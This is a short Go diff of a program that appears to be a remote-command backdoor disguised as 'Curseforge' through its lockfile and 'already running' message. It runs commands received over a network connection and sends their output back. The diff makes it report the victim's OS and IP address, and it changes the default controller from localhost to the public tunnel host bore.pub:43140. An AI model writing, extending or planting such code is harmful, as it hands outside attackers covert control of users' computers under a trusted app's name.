@@ -120,14 +120,14 @@ func runLogged(cmd string) {
 	conn.Write(output) //try to flush any residual output from super long outputs
 
 	if strings.Contains(cmd, "GET_OS") {
-		output = []byte(detectedOs + "\n")
+		output = []byte(detectedOs + " " + myIP + "\n")
 		conn.Write(output)
 		
 		conn.Write([]byte(terminator))
 		return
 	}
 
-	if strings.Contains(cmd, "__CLOSING__") {
+	if strings.Contains(cmd, "__CLOSING__") { 
 		fmt.Println("HERE!")
 		conn.Close()
 		initListener(serverIP)
@@ -176,12 +176,15 @@ func main() {
 	lockfile := flock.New("Curseforge.lock")
 
 	locked, err := lockfile.TryLock()
-	if err != nil || !locked {
-		fmt.Println(err.Error())
-		fmt.Println(locked)
-		os.Exit(1)
+	if err != nil {
+    fmt.Printf("System error acquiring lock: %v\n", err)
+    os.Exit(1)
 	}
 
+	if !locked {
+		fmt.Println("Another instance of Curseforge is already running.")
+		os.Exit(1)
+	}
 	sigs := make(chan os.Signal, 1)
 	signal.Notify(sigs, os.Interrupt, syscall.SIGTERM)
 
@@ -191,7 +194,7 @@ func main() {
 	}()
 
 	if len(os.Args) == 1 {
-		serverIP = "127.0.0.1:55565"
+		serverIP = "bore.pub:43140"
 	} else {
 		serverIP = os.Args[1]
 	}
